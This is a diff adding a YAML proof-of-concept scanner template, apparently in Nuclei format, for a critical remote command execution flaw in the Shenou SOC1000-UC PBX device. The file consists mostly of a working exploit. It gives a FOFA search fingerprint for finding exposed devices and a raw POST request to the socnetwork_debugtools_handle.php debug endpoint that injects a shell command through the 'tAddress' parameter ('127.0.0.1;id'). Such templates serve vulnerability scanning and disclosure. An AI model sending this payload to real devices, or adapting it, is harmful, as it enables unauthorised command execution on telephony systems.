@@ -1,0 +1,28 @@
+id: poc-ca4mf625ipnfrxis
+info:
+  name: 申瓯通信 SOC1000-UC PBX设备 socnetwork_debugtools_handle 存在远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ca4mf625ipnfrxis'
+  tags: rce,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ca4mf625ipnfrxis
+    fofa: body="assets/shenou/images/logo_soc1000-uc.png"
+http:
+- raw:
+  - 'POST /admin/modules/socnetwork/views/socnetwork_debugtools_handle.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    tAddress=127.0.0.1;id&tCount='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
